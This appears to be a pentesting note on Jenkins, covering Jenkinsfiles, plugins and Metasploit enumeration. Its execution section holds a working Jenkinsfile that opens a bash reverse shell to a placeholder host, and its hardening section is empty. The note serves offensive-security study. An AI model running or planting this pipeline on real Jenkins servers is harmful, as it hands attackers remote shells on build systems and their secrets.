---
tags:
  - "#type/tech-specific"
  - "#attack/reconnaissance/active"
  - "#attack/discovery"
---
# Fundamentals

Jenkins uses files called `Jenkinsfile` to define workflows. If a Jenkinsfile is writeable, you can manipulate the workflow. Jenkinsfiles are written in a Domain specific language based Groovy.

## Plugins

Jenkins heavily relies on plugins to extend its functionality. For example:

- [AWS Steps](https://plugins.jenkins.io/pipeline-aws/): for performing actions on [[2 Tech-Specifics/Cloud/AWS/Fundamentals - AWS|AWS]]
- [Nodes and Processes](https://plugins.jenkins.io/workflow-durable-task-step/): run shell scripts on the builder - developed by Jenkins, very popular
- Further Plugins: https://plugins.jenkins.io/

# Pentesting

## Enumeration

e.g. use [[3 Tools/exploitation frameworks/Metasploit/Overview - Metasploit|Metasploit]] module `auxiliary/scanner/http/jenkins_enum`

## Execution

By modifying a Jenkinsfile and triggering a workflow run, you might be able to run arbitrary commands on the runner.

Below is an example Jenkinsfile that uses the [Nodes and Processes](https://plugins.jenkins.io/workflow-durable-task-step/) plugin to run shell commands to start a [[3 Tools/shells/bash|bash]] reverse shell. The `isUnix()` check ensures the runner is unix-based before running the command.

```groovy
pipeline {
  agent any

  stages {
    stage('Build') {
      steps{
        script {
          if (isUnix()) {
            sh 'bash -c "bash -i >& /dev/tcp/<ip>/4444 0>&1" & '
          }
        }
      }
    }
  }
}
```

# Hardening
